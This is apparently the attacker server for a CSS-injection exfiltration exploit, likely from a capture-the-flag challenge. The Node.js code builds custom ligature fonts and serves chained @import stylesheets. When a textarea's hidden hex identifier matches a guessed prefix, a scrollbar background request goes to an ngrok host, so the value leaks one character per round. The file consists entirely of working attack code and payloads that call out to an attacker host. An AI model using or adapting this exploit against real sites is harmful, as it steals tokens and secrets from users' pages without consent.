
const express = require('express');
const app = express();
app.disable('etag');
 
const PORT = 22000;
const js2xmlparser = require('js2xmlparser');
const fs = require('fs');
const tmp = require('tmp');
const rimraf = require('rimraf');
const child_process = require('child_process');

let prefix = "id";
let prospectivePrefix = "id-";
let pendingResponses = {};
let potentialCharacters = "abcdef0123456789";
let responseTimeout = -1;
let fontsCached = {};
let reqNumber = 0;

let fontCachingPhase=true;

app.use(express.static(process.cwd()));

// Create font where the only character of any width is the prefix ligature
function createFont(prefix) {
    let font = {
        "defs": {
            "font": {
                "@": {
                    "id": "hack",
                    "horiz-adv-x": "0"
                },
                "font-face": {
                    "@": {
                        "font-family": "hack",
                        "units-per-em": "1000"
                    }
                },
                "glyph": []
            }
        }
    };
    
    let glyphs = font.defs.font.glyph;
    for (let c = 0x20; c <= 0x7e; c += 1) {
        const glyph = {
            "@": {
                "unicode": String.fromCharCode(c),
                "horiz-adv-x": "0",
                "d": "M1 0z",
            }
        };
        glyphs.push(glyph);
    }
    
    const glyph = {
        "@": {
            "unicode": prefix,
            "horiz-adv-x": "10000",
            "d": "M1 0z",
        }
    }
    glyphs.push(glyph);
    
    const xml = js2xmlparser.parse("svg", font);
    
    const tmpobj = tmp.dirSync();
    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
    child_process.spawnSync("/usr/bin/fontforge", [
        `${__dirname}/script.fontforge`,
        `${tmpobj.name}/font.svg`
    ]);
 
    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
    
    rimraf.sync(tmpobj.name);
 
    return woff;
}
 
// font with the set of ligatures as the only thing with width
app.get("/f/:charsToLigature", (req, res) => {
    const { charsToLigature } = req.params;
    
    res.set({
        'Cache-Control': 'public, max-age=600',
        'Content-Type': 'application/font-woff',
        'Access-Control-Allow-Origin': '*',
    });
    console.log('Sending font for ' + charsToLigature);
    res.send(createFont(charsToLigature));
    if (charsToLigature.substring(0, charsToLigature.length - 1) === prefix) {
        if (!fontsCached[prefix]) {
            fontsCached[prefix] = 0;
        }
        fontsCached[prefix] = fontsCached[prefix] + 1;
        if (fontsCached[prefix] === 16) {
            if (responseTimeout != -1) {
                console.log('Clearing response interval since we got all the fonts');
                clearInterval(responseTimeout);
            }
            console.log('16 Fonts Cached, sending next import');
            fontCachingPhase = false;
            process.nextTick(respondToQueuedRequest);
        }
    }
});
 
// Create/return an attack css for a single 
app.get("/a", function(req, res) {
    reqNumber++;
    console.log('Queueing request for import #', req.query.r)
    pendingResponses[parseInt(req.query.r)] = res;
    if (req.query.r === "0") {
        responseTimeout = setTimeout(() => {
            fontCachingPhase = false;
            respondToQueuedRequest();
        }, 2500);
    }
});

app.get("/p/:value", function(req, res) {
    fontCachingPhase = true;
    prefix = req.params.value;
    console.log('Got prefix', prefix);
    prospectivePrefix = prefix + "a";
    if (responseTimeout != -1) {
        console.log('Clearing response interval since we found the prefix');
        clearInterval(responseTimeout);
    }
    res.sendFile('scrollbar.png', { root: __dirname });
    console.log('Sending next caching import');
    process.nextTick(respondToQueuedRequest)
});
 
app.listen(PORT, () => {
	console.log(`Listening on ${PORT}...`);
});

function respondToQueuedRequest() {
    console.log('Responding to import request');
    responseTimeout = -1;
    let reqNos = Object.keys(pendingResponses);
    let nextResponseNum = Math.min(...reqNos);
    let res = pendingResponses[nextResponseNum];
    delete pendingResponses[nextResponseNum];
    let css;
    if (fontCachingPhase) {
        console.log('Responding with font caching/reset request');
        css = `
        @import url(https://a22c2da74489.ngrok.io/a?r=${reqNumber});
        
        @font-face {
            font-family: "hack${prefix}a";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}a)
        }
        @font-face {
            font-family: "hack${prefix}b";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}b)
        }
        @font-face {
            font-family: "hack${prefix}c";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}c)
        }
        @font-face {
            font-family: "hack${prefix}d";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}d)
        }
        @font-face {
            font-family: "hack${prefix}e";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}e)
        }
        @font-face {
            font-family: "hack${prefix}f";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}f)
        }
        @font-face {
            font-family: "hack${prefix}0";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}0)
        }
        @font-face {
            font-family: "hack${prefix}1";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}1)
        }
        @font-face {
            font-family: "hack${prefix}2";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}2)
        }
        @font-face {
            font-family: "hack${prefix}3";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}3)
        }
        @font-face {
            font-family: "hack${prefix}4";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}4)
        }
        @font-face {
            font-family: "hack${prefix}5";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}5)
        }
        @font-face {
            font-family: "hack${prefix}6";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}6)
        }
        @font-face {
            font-family: "hack${prefix}7";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}7)
        }
        @font-face {
            font-family: "hack${prefix}8";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}8)
        }
        @font-face {
            font-family: "hack${prefix}9";
            src: url(https://a22c2da74489.ngrok.io/f/${prefix}9)
        }
        
        ul li:first-of-type textarea:nth-of-type(2) {
            display: block!important;
            white-space: nowrap;
            width: 80px;
            height: 40px;
            font-family: "hackzzz"
        }
        
        ul li:first-of-type textarea:nth-of-type(2)::-webkit-scrollbar {
            background: #00f
        }
        
        body h2 {font-family: "hack${prefix}a"}
        body h2::after {font-family: "hack${prefix}b"; content: "a"}
        body h2::before {font-family: "hack${prefix}c"; content: "b"}
        body h2::first-letter {font-family: "hack${prefix}d"}
        body h3 {font-family: "hack${prefix}e"}
        body h3::after {font-family: "hack${prefix}f"; content: "a"}
        body h3::before {font-family: "hack${prefix}1"; content: "a"}
        body h3::first-letter {font-family: "hack${prefix}2"}
        body ul:first-of-type li:first-of-type > span:first-of-type {font-family: "hack${prefix}3"}
        body ul:first-of-type li:first-of-type > span:first-of-type::before {font-family: "hack${prefix}4"; content:"a"}
        body ul:first-of-type li:first-of-type > span:first-of-type::after {font-family: "hack${prefix}5"; content:"a"}
        body input[name=recipient] {font-family: "hack${prefix}6" }
        body ul:first-of-type li:first-of-type > form > span {font-family: "hack${prefix}7"}
        body ul:first-of-type li:first-of-type > form > span::before {font-family: "hack${prefix}8"; content:"a"}
        body ul:first-of-type li:first-of-type > form > span::after {font-family: "hack${prefix}9"; content:"a"}
        body span.error {font-family: "hack${prefix}0";}`;
    } else {
        if (prospectivePrefix === 'id-') {
            prospectivePrefix = 'ida';
        } else {
            let lastChar = prospectivePrefix[prospectivePrefix.length - 1];
            let nextChar = potentialCharacters[potentialCharacters.indexOf(lastChar) + 1];
            prospectivePrefix = prefix + nextChar;
        }
        console.log('Responding with test for next prospective prefix', prospectivePrefix);
        css = `@import url(https://a22c2da74489.ngrok.io/a?r=${reqNumber});
        
        @font-face {
            font-family: "hack${prospectivePrefix}";
            src: url(https://a22c2da74489.ngrok.io/f/${prospectivePrefix})
        }
        
        ul li:first-of-type textarea:nth-of-type(2) {
            display: block !important;
            white-space: nowrap;
            width: 80px;
            height: 40px;
            font-family: "hack${prospectivePrefix}";
        }
        
        textarea::-webkit-scrollbar {
            background: blue;
        }
        
        textarea::-webkit-scrollbar:horizontal {
            background: url(https://a22c2da74489.ngrok.io/p/${prospectivePrefix});
        }`;
    }
    res.type('css');
    res.send(css);
    if (!fontCachingPhase) {
        console.log('Not in font caching phase, queueing up next import test');
        responseTimeout = setTimeout(respondToQueuedRequest, 2500);
    } else {
        console.log('Setting timeout for font caching in case they\'re all already cached');
        responseTimeout = setTimeout(() => {
            fontCachingPhase = false;
            respondToQueuedRequest();
        }, 5000);
    }
}